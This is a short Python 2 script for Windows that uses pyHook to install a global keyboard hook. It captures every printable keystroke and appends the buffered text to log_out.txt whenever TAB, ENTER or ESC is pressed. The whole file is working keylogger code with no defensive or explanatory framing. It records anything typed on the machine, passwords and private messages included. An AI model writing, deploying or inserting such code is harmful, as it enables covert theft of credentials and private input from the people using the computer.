import pythoncom, pyHook, sys, logging
# specials = {8:'BACKSPACE',9:'TAB',13:'ENTER',27:'ESC',32:'SPACE'}
specials = {9:'TAB',13:'ENTER',27:'ESC'}
buffer = ''
def OnKeyboardEvent(event):
    logging.basicConfig(filename='log_out.txt',level=logging.DEBUG, format='%(message)s')
    global buffer

    if event.Ascii in range(32,127):
        print chr(event.Ascii)
        buffer += chr(event.Ascii)
    if event.Ascii in specials:
        print '<' + specials[event.Ascii] + '>'
        logging.log(10,buffer)
        buffer = ''
        logging.log(10,'<' + specials[event.Ascii] + '>')
    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
